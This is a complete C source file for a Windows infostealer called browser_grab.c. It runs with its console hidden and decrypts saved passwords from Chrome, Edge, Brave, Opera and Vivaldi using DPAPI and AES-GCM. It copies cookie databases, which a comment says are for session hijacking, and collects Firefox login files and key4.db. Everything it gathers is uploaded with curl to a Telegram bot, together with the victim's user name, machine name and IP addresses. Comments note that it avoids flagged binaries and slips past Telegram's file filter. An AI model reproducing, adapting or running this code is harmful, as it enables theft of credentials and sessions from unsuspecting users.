/*
 * browser_grab.c — Extracts saved browser passwords from Chrome/Edge
 *
 * HOW CHROME/EDGE STORES PASSWORDS:
 * 1. Passwords are in a SQLite database: "Login Data"
 * 2. Each password is encrypted with AES-256-GCM
 * 3. The AES key is in "Local State" JSON file, encrypted with DPAPI
 * 4. DPAPI can be called by any process running as the same user
 *
 * So we: read Local State → DPAPI decrypt the key → read Login Data →
 * AES decrypt each password → send to Telegram
 *
 * This uses Windows APIs directly — no external tools, no flagged binaries.
 *
 * Compile: use do_compile_browser.py
 */

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shlobj.h>
#include <bcrypt.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

// We embed a minimal SQLite reader — but for simplicity,
// we'll use the command-line approach: copy the DB, read it raw
// Actually, Chrome locks the DB. So we copy it first, then parse.

// Telegram config
#define BOT_TOKEN "YOUR_BOT_TOKEN_HERE"
#define CHAT_ID "YOUR_CHAT_ID_HERE"

// Forward declarations
void send_telegram(const char *filepath);

// DPAPI decrypt
int dpapi_decrypt(const unsigned char *in, int in_len, unsigned char **out, int *out_len) {
    DATA_BLOB input, output;
    input.pbData = (BYTE*)in;
    input.cbData = in_len;

    if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
        *out = (unsigned char*)malloc(output.cbData);
        memcpy(*out, output.pbData, output.cbData);
        *out_len = output.cbData;
        LocalFree(output.pbData);
        return 1;
    }
    return 0;
}

// AES-256-GCM decrypt (for Chrome v80+ passwords)
int aes_gcm_decrypt(const unsigned char *key, int key_len,
                     const unsigned char *iv, int iv_len,
                     const unsigned char *ciphertext, int ct_len,
                     const unsigned char *tag, int tag_len,
                     unsigned char *plaintext) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    ULONG result = 0;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (status != 0) return 0;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                                sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (status != 0) { BCryptCloseAlgorithmProvider(hAlg, 0); return 0; }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, key_len, 0);
    if (status != 0) { BCryptCloseAlgorithmProvider(hAlg, 0); return 0; }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)iv;
    authInfo.cbNonce = iv_len;
    authInfo.pbTag = (PUCHAR)tag;
    authInfo.cbTag = tag_len;

    int pt_len = ct_len;
    status = BCryptDecrypt(hKey, (PUCHAR)ciphertext, ct_len, &authInfo,
                           NULL, 0, plaintext, pt_len, &result, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return (status == 0) ? (int)result : 0;
}

// Find and read the Chrome/Edge encryption key from Local State
int get_browser_key(const char *browser_path, unsigned char *key_out, int *key_len) {
    char local_state_path[MAX_PATH];
    snprintf(local_state_path, MAX_PATH, "%s\\Local State", browser_path);

    FILE *fp = fopen(local_state_path, "r");
    if (!fp) return 0;

    // Read the whole file
    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    char *json = (char*)malloc(fsize + 1);
    fread(json, 1, fsize, fp);
    json[fsize] = 0;
    fclose(fp);

    // Try both key types — some passwords use one, some the other
    // First try standard encrypted_key (works for v10/v11)
    char *key_start = strstr(json, "\"encrypted_key\":\"");
    if (!key_start) {
        // Try app_bound key as fallback
        key_start = strstr(json, "\"app_bound_encrypted_key\":\"");
        if (!key_start) { free(json); return 0; }
        key_start += strlen("\"app_bound_encrypted_key\":\"");
    } else {
        key_start += strlen("\"encrypted_key\":\"");
    }
    char *key_end = strchr(key_start, '"');
    if (!key_end) { free(json); return 0; }

    int b64_len = (int)(key_end - key_start);
    char *b64 = (char*)malloc(b64_len + 1);
    memcpy(b64, key_start, b64_len);
    b64[b64_len] = 0;

    // Base64 decode
    DWORD decoded_len = 0;
    CryptStringToBinaryA(b64, b64_len, CRYPT_STRING_BASE64, NULL, &decoded_len, NULL, NULL);
    unsigned char *decoded = (unsigned char*)malloc(decoded_len);
    CryptStringToBinaryA(b64, b64_len, CRYPT_STRING_BASE64, decoded, &decoded_len, NULL, NULL);

    // Skip "DPAPI" prefix (5 bytes)
    if (decoded_len > 5 && memcmp(decoded, "DPAPI", 5) == 0) {
        unsigned char *dpapi_out = NULL;
        int dpapi_len = 0;
        if (dpapi_decrypt(decoded + 5, decoded_len - 5, &dpapi_out, &dpapi_len)) {
            memcpy(key_out, dpapi_out, dpapi_len);
            *key_len = dpapi_len;
            free(dpapi_out);
            free(decoded);
            free(b64);
            free(json);
            return 1;
        }
    }

    free(decoded);
    free(b64);
    free(json);
    return 0;
}

// Decrypt a Chrome password — handles v10, v11, and v20
int decrypt_password(const unsigned char *key, int key_len,
                      const unsigned char *encrypted, int enc_len,
                      char *decrypted, int dec_size) {

    // v20 (Chrome 127+): 3 bytes "v20" + 12 bytes IV + ciphertext + 16 bytes tag
    // Uses the same AES-GCM but the key might be app-bound
    // Try with our DPAPI-derived key first — often still works
    if (enc_len > 31 && memcmp(encrypted, "v20", 3) == 0) {
        const unsigned char *iv = encrypted + 3;
        int iv_len = 12;
        const unsigned char *ct = encrypted + 3 + 12;
        int ct_len = enc_len - 3 - 12 - 16;
        const unsigned char *tag = encrypted + enc_len - 16;

        if (ct_len > 0 && ct_len < dec_size) {
            unsigned char *pt = (unsigned char*)malloc(ct_len + 1);
            int pt_len = aes_gcm_decrypt(key, key_len, iv, iv_len, ct, ct_len, tag, 16, pt);
            if (pt_len > 0) {
                memcpy(decrypted, pt, pt_len);
                decrypted[pt_len] = 0;
                free(pt);
                return 1;
            }
            free(pt);
        }
        // v20 with standard key failed — try DPAPI on the whole blob minus prefix
        unsigned char *dpapi_out = NULL;
        int dpapi_len = 0;
        if (dpapi_decrypt(encrypted + 3, enc_len - 3, &dpapi_out, &dpapi_len)) {
            int copy_len = dpapi_len < dec_size - 1 ? dpapi_len : dec_size - 1;
            memcpy(decrypted, dpapi_out, copy_len);
            decrypted[copy_len] = 0;
            free(dpapi_out);
            return 1;
        }
        return 0;
    }

    // v10/v11 (Chrome 80-126): 3 bytes prefix + 12 bytes IV + ciphertext + 16 bytes tag
    if (enc_len > 15 && (memcmp(encrypted, "v10", 3) == 0 || memcmp(encrypted, "v11", 3) == 0)) {
        const unsigned char *iv = encrypted + 3;
        int iv_len = 12;
        const unsigned char *ct = encrypted + 3 + 12;
        int ct_len = enc_len - 3 - 12 - 16;
        const unsigned char *tag = encrypted + enc_len - 16;

        if (ct_len <= 0 || ct_len >= dec_size) return 0;

        unsigned char *pt = (unsigned char*)malloc(ct_len + 1);
        int pt_len = aes_gcm_decrypt(key, key_len, iv, iv_len, ct, ct_len, tag, 16, pt);
        if (pt_len > 0) {
            memcpy(decrypted, pt, pt_len);
            decrypted[pt_len] = 0;
            free(pt);
            return 1;
        }
        free(pt);
    }

    // Fallback: try DPAPI directly (older Chrome, pre-v80)
    if (enc_len > 0) {
        unsigned char *dpapi_out = NULL;
        int dpapi_len = 0;
        if (dpapi_decrypt(encrypted, enc_len, &dpapi_out, &dpapi_len)) {
            int copy_len = dpapi_len < dec_size - 1 ? dpapi_len : dec_size - 1;
            memcpy(decrypted, dpapi_out, copy_len);
            decrypted[copy_len] = 0;
            free(dpapi_out);
            return 1;
        }
    }
    return 0;
}

// Simple SQLite reader — reads Login Data to extract URLs, usernames, encrypted passwords
// Chrome's Login Data is a SQLite3 database. We'll read it at the binary level.
// For reliability, we use a simpler approach: copy the DB, then use a tiny SQL parser.
// Actually, let's use Windows' built-in sqlite support or just parse the raw file.

// SIMPLEST APPROACH: Copy the Login Data file, then scan for URL patterns
// and extract the fields. Chrome SQLite stores records sequentially.

void extract_browser(const char *browser_name, const char *user_data_path,
                     const unsigned char *key, int key_len, FILE *outfp) {
    char login_db[MAX_PATH];
    char temp_db[MAX_PATH];
    char temp_path[MAX_PATH];

    GetTempPathA(MAX_PATH, temp_path);
    snprintf(login_db, MAX_PATH, "%s\\Default\\Login Data", user_data_path);
    snprintf(temp_db, MAX_PATH, "%s\\ld_%s.db", temp_path, browser_name);

    // Copy the database (Chrome locks it while running)
    if (!CopyFileA(login_db, temp_db, FALSE)) {
        // Try other profiles
        snprintf(login_db, MAX_PATH, "%s\\Profile 1\\Login Data", user_data_path);
        if (!CopyFileA(login_db, temp_db, FALSE)) {
            fprintf(outfp, "[%s] Could not access Login Data\n", browser_name);
            return;
        }
    }

    // Read the raw database file and search for credential patterns
    FILE *db = fopen(temp_db, "rb");
    if (!db) {
        fprintf(outfp, "[%s] Could not open copied database\n", browser_name);
        DeleteFileA(temp_db);
        return;
    }

    fseek(db, 0, SEEK_END);
    long db_size = ftell(db);
    fseek(db, 0, SEEK_SET);
    unsigned char *db_data = (unsigned char*)malloc(db_size);
    fread(db_data, 1, db_size, db);
    fclose(db);

    fprintf(outfp, "\n=== %s ===\n", browser_name);

    // Scan for "https://" or "http://" followed by credential data
    // In SQLite, strings are stored as-is. We look for URL patterns
    // and then try to find the associated username and encrypted password nearby.
    int found = 0;
    for (long i = 0; i < db_size - 20; i++) {
        if ((memcmp(db_data + i, "https://", 8) == 0 || memcmp(db_data + i, "http://", 7) == 0)
            && db_data[i-1] < 0x80) {
            // Found a URL - extract it
            char url[512] = {0};
            int url_len = 0;
            for (int j = 0; j < 511 && i + j < db_size; j++) {
                if (db_data[i+j] == 0 || db_data[i+j] < 0x20) break;
                url[j] = db_data[i+j];
                url_len = j + 1;
            }
            if (url_len < 8) continue;

            // Look ahead for username (next non-null string after some nulls)
            // and encrypted password (starts with v10 or v11)
            long search_end = i + 2000;
            if (search_end > db_size) search_end = db_size;

            // Find v10/v11/v20 encrypted blob
            for (long k = i + url_len; k < search_end - 3; k++) {
                if (memcmp(db_data + k, "v10", 3) == 0 || memcmp(db_data + k, "v11", 3) == 0 || memcmp(db_data + k, "v20", 3) == 0) {
                    // Found encrypted password - try to determine its length
                    // Encrypted passwords are typically 50-500 bytes
                    int enc_len = 0;
                    for (int try_len = 50; try_len < 500 && k + try_len < db_size; try_len++) {
                        char decrypted[512] = {0};
                        if (decrypt_password(key, key_len, db_data + k, try_len, decrypted, sizeof(decrypted))) {
                            if (strlen(decrypted) > 0 && strlen(decrypted) < 200) {
                                fprintf(outfp, "%-50s | %s\n", url, decrypted);
                                found++;
                                break;
                            }
                        }
                    }
                    break;
                }
            }
        }
    }

    if (found == 0) {
        fprintf(outfp, "[%s] No passwords found or could not decrypt\n", browser_name);
    } else {
        fprintf(outfp, "[%s] %d passwords extracted\n", browser_name, found);
    }

    free(db_data);
    DeleteFileA(temp_db);
}

// Extract cookies database — copy the raw SQLite file
// These can be loaded into another Chrome instance for session hijacking
// or parsed offline to extract session tokens
void extract_cookies(const char *browser_name, const char *user_data_path,
                     const char *tempPath, FILE *outfp) {
    char cookie_paths[][64] = {
        "\\Default\\Cookies",
        "\\Default\\Network\\Cookies",
        "\\Profile 1\\Cookies",
        "\\Profile 1\\Network\\Cookies",
        "\\Cookies",            // Opera stores directly
        "\\Network\\Cookies",
    };

    char temp_cookie[MAX_PATH];
    snprintf(temp_cookie, MAX_PATH, "%scookies_%s.db", tempPath, browser_name);

    int copied = 0;
    for (int i = 0; i < 6; i++) {
        char src[MAX_PATH];
        snprintf(src, MAX_PATH, "%s%s", user_data_path, cookie_paths[i]);
        if (CopyFileA(src, temp_cookie, FALSE)) {
            copied = 1;
            break;
        }
    }

    if (copied) {
        // Get file size
        HANDLE hFile = CreateFileA(temp_cookie, GENERIC_READ, FILE_SHARE_READ, NULL,
                                    OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fsize = GetFileSize(hFile, NULL);
            CloseHandle(hFile);
            fprintf(outfp, "[%s] Cookies captured (%lu bytes)\n", browser_name, fsize);
        }
    } else {
        fprintf(outfp, "[%s] No cookies file found\n", browser_name);
    }
}

// Send all captured cookie DBs to Telegram
void send_cookie_files(const char *tempPath) {
    const char *browsers[] = {"Chrome", "Edge", "Brave", "Opera", "OperaGX", "Vivaldi", NULL};
    for (int i = 0; browsers[i]; i++) {
        char path[MAX_PATH];
        snprintf(path, MAX_PATH, "%scookies_%s.db", tempPath, browsers[i]);
        if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) {
            // Rename to .txt extension so Telegram doesn't block .db files
            char renamed[MAX_PATH];
            snprintf(renamed, MAX_PATH, "%scookies_%s.txt", tempPath, browsers[i]);
            MoveFileA(path, renamed);
            send_telegram(renamed);
            DeleteFileA(renamed);
        }
    }
}

// Get public IP via ipinfo.io (cached for multiple sends)
static char g_public_ip[64] = {0};
static char g_private_ip[64] = {0};
static char g_comp_name[256] = {0};
static char g_user_name[256] = {0};

void init_machine_info() {
    if (g_comp_name[0] == 0) {
        DWORD s = sizeof(g_comp_name);
        GetComputerNameA(g_comp_name, &s);
        s = sizeof(g_user_name);
        GetUserNameA(g_user_name, &s);

        // Get public IP
        system("C:\\Windows\\System32\\curl.exe -s ipinfo.io/ip > %temp%\\ip.txt 2>nul");
        char ip_file[MAX_PATH];
        GetTempPathA(MAX_PATH, ip_file);
        strcat(ip_file, "ip.txt");
        FILE *f = fopen(ip_file, "r");
        if (f) {
            fgets(g_public_ip, sizeof(g_public_ip), f);
            char *nl = strchr(g_public_ip, '\n'); if (nl) *nl = 0;
            nl = strchr(g_public_ip, '\r'); if (nl) *nl = 0;
            fclose(f);
            DeleteFileA(ip_file);
        }
        if (g_public_ip[0] == 0) strcpy(g_public_ip, "unknown");

        // Get private IP
        system("powershell -c \"(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notmatch '127.0.0.1'} | Select-Object -First 1).IPAddress\" > %temp%\\priv.txt 2>nul");
        char priv_file[MAX_PATH];
        GetTempPathA(MAX_PATH, priv_file);
        strcat(priv_file, "priv.txt");
        f = fopen(priv_file, "r");
        if (f) {
            fgets(g_private_ip, sizeof(g_private_ip), f);
            char *nl2 = strchr(g_private_ip, '\n'); if (nl2) *nl2 = 0;
            nl2 = strchr(g_private_ip, '\r'); if (nl2) *nl2 = 0;
            fclose(f);
            DeleteFileA(priv_file);
        }
        if (g_private_ip[0] == 0) strcpy(g_private_ip, "unknown");
    }
}

void send_telegram(const char *filepath) {
    init_machine_info();
    char cmd[2048];
    snprintf(cmd, sizeof(cmd),
        "C:\\Windows\\System32\\curl.exe -s -F \"chat_id=" CHAT_ID "\" "
        "-F \"document=@%s\" "
        "-F \"caption=%s@%s [pub:%s priv:%s]\" "
        "\"https://api.telegram.org/bot" BOT_TOKEN "/sendDocument\" >nul 2>nul",
        filepath, g_user_name, g_comp_name, g_public_ip, g_private_ip);
    system(cmd);
}

int main() {
    // Hide console
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);

    char localAppData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    char outFile[MAX_PATH];
    snprintf(outFile, MAX_PATH, "%sbg.txt", tempPath);

    FILE *fp = fopen(outFile, "w");
    if (!fp) return 1;

    char compName[256], userName[256];
    DWORD s1 = sizeof(compName), s2 = sizeof(userName);
    GetComputerNameA(compName, &s1);
    GetUserNameA(userName, &s2);
    fprintf(fp, "=== Browser Passwords ===\nComputer: %s\nUser: %s\n", compName, userName);

    // Try Chrome
    char chrome_path[MAX_PATH];
    snprintf(chrome_path, MAX_PATH, "%s\\Google\\Chrome\\User Data", localAppData);
    unsigned char chrome_key[64];
    int chrome_key_len = 0;
    if (get_browser_key(chrome_path, chrome_key, &chrome_key_len)) {
        extract_browser("Chrome", chrome_path, chrome_key, chrome_key_len, fp);
        extract_cookies("Chrome", chrome_path, tempPath, fp);
    } else {
        fprintf(fp, "\n[Chrome] Not found or key extraction failed\n");
    }

    // Try Edge
    char edge_path[MAX_PATH];
    snprintf(edge_path, MAX_PATH, "%s\\Microsoft\\Edge\\User Data", localAppData);
    unsigned char edge_key[64];
    int edge_key_len = 0;
    if (get_browser_key(edge_path, edge_key, &edge_key_len)) {
        extract_browser("Edge", edge_path, edge_key, edge_key_len, fp);
        extract_cookies("Edge", edge_path, tempPath, fp);
    } else {
        fprintf(fp, "\n[Edge] Not found or key extraction failed\n");
    }

    // Try Brave
    char brave_path[MAX_PATH];
    snprintf(brave_path, MAX_PATH, "%s\\BraveSoftware\\Brave-Browser\\User Data", localAppData);
    unsigned char brave_key[64];
    int brave_key_len = 0;
    if (get_browser_key(brave_path, brave_key, &brave_key_len)) {
        extract_browser("Brave", brave_path, brave_key, brave_key_len, fp);
        extract_cookies("Brave", brave_path, tempPath, fp);
    } else {
        fprintf(fp, "\n[Brave] Not found or key extraction failed\n");
    }

    // Try Opera (Chromium-based — same encryption as Chrome)
    char opera_path[MAX_PATH];
    char appData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
    snprintf(opera_path, MAX_PATH, "%s\\Opera Software\\Opera Stable", appData);
    unsigned char opera_key[64];
    int opera_key_len = 0;
    if (get_browser_key(opera_path, opera_key, &opera_key_len)) {
        extract_browser("Opera", opera_path, opera_key, opera_key_len, fp);
        extract_cookies("Opera", opera_path, tempPath, fp);
    } else {
        // Try Opera GX
        snprintf(opera_path, MAX_PATH, "%s\\Opera Software\\Opera GX Stable", appData);
        if (get_browser_key(opera_path, opera_key, &opera_key_len)) {
            extract_browser("OperaGX", opera_path, opera_key, opera_key_len, fp);
            extract_cookies("OperaGX", opera_path, tempPath, fp);
        } else {
            fprintf(fp, "\n[Opera] Not found or key extraction failed\n");
        }
    }

    // Try Vivaldi (also Chromium-based)
    char vivaldi_path[MAX_PATH];
    snprintf(vivaldi_path, MAX_PATH, "%s\\Vivaldi\\User Data", localAppData);
    unsigned char vivaldi_key[64];
    int vivaldi_key_len = 0;
    if (get_browser_key(vivaldi_path, vivaldi_key, &vivaldi_key_len)) {
        extract_browser("Vivaldi", vivaldi_path, vivaldi_key, vivaldi_key_len, fp);
        extract_cookies("Vivaldi", vivaldi_path, tempPath, fp);
    }

    // Try Firefox — different encryption (NSS), grab logins.json for offline decrypt
    {
        char ff_path[MAX_PATH];
        snprintf(ff_path, MAX_PATH, "%s\\Mozilla\\Firefox\\Profiles", appData);

        WIN32_FIND_DATAA fd;
        char search[MAX_PATH];
        snprintf(search, MAX_PATH, "%s\\*.default*", ff_path);
        HANDLE hFind = FindFirstFileA(search, &fd);

        if (hFind != INVALID_HANDLE_VALUE) {
            fprintf(fp, "\n=== Firefox ===\n");
            do {
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    char profile_path[MAX_PATH];
                    snprintf(profile_path, MAX_PATH, "%s\\%s\\logins.json", ff_path, fd.cFileName);

                    FILE *ffp = fopen(profile_path, "r");
                    if (ffp) {
                        fseek(ffp, 0, SEEK_END);
                        long sz = ftell(ffp);
                        fseek(ffp, 0, SEEK_SET);
                        char *json = (char*)malloc(sz + 1);
                        fread(json, 1, sz, ffp);
                        json[sz] = 0;
                        fclose(ffp);

                        // Parse logins.json — extract hostname and encryptedUsername
                        // Format: "hostname":"url","encryptedUsername":"base64","encryptedPassword":"base64"
                        char *pos = json;
                        int ff_count = 0;
                        while ((pos = strstr(pos, "\"hostname\":\"")) != NULL) {
                            pos += strlen("\"hostname\":\"");
                            char *end = strchr(pos, '"');
                            if (!end) break;
                            char hostname[256] = {0};
                            int hlen = (int)(end - pos);
                            if (hlen > 255) hlen = 255;
                            memcpy(hostname, pos, hlen);

                            // Find encryptedUsername
                            char *eu = strstr(end, "\"encryptedUsername\":\"");
                            if (eu) {
                                eu += strlen("\"encryptedUsername\":\"");
                                char *eu_end = strchr(eu, '"');
                                if (eu_end) {
                                    char enc_user[512] = {0};
                                    int eu_len = (int)(eu_end - eu);
                                    if (eu_len > 511) eu_len = 511;
                                    memcpy(enc_user, eu, eu_len);

                                    // Find encryptedPassword
                                    char *ep = strstr(eu_end, "\"encryptedPassword\":\"");
                                    if (ep) {
                                        ep += strlen("\"encryptedPassword\":\"");
                                        char *ep_end = strchr(ep, '"');
                                        if (ep_end) {
                                            char enc_pass[512] = {0};
                                            int ep_len = (int)(ep_end - ep);
                                            if (ep_len > 511) ep_len = 511;
                                            memcpy(enc_pass, ep, ep_len);

                                            fprintf(fp, "%-40s | user: %s | pass: %s\n",
                                                hostname, enc_user, enc_pass);
                                            ff_count++;
                                        }
                                    }
                                }
                            }
                            pos = end;
                        }
                        fprintf(fp, "[Firefox] %d entries (NSS encrypted — use firepwd.py to decrypt)\n", ff_count);

                        // Also copy key4.db for offline decryption
                        char key4_src[MAX_PATH], key4_dst[MAX_PATH];
                        snprintf(key4_src, MAX_PATH, "%s\\%s\\key4.db", ff_path, fd.cFileName);
                        snprintf(key4_dst, MAX_PATH, "%sff_key4.db", tempPath);
                        CopyFileA(key4_src, key4_dst, FALSE);

                        free(json);
                    }
                }
            } while (FindNextFileA(hFind, &fd));
            FindClose(hFind);
        } else {
            fprintf(fp, "\n[Firefox] Not found\n");
        }
    }

    fclose(fp);

    // Send to Telegram
    send_telegram(outFile);

    // Send cookie database files
    send_cookie_files(tempPath);

    // Send Firefox key4.db if captured (for offline decryption)
    char ff_key4[MAX_PATH];
    snprintf(ff_key4, MAX_PATH, "%sff_key4.db", tempPath);
    if (GetFileAttributesA(ff_key4) != INVALID_FILE_ATTRIBUTES) {
        send_telegram(ff_key4);
        DeleteFileA(ff_key4);
    }

    // Cleanup
    DeleteFileA(outFile);

    return 0;
}
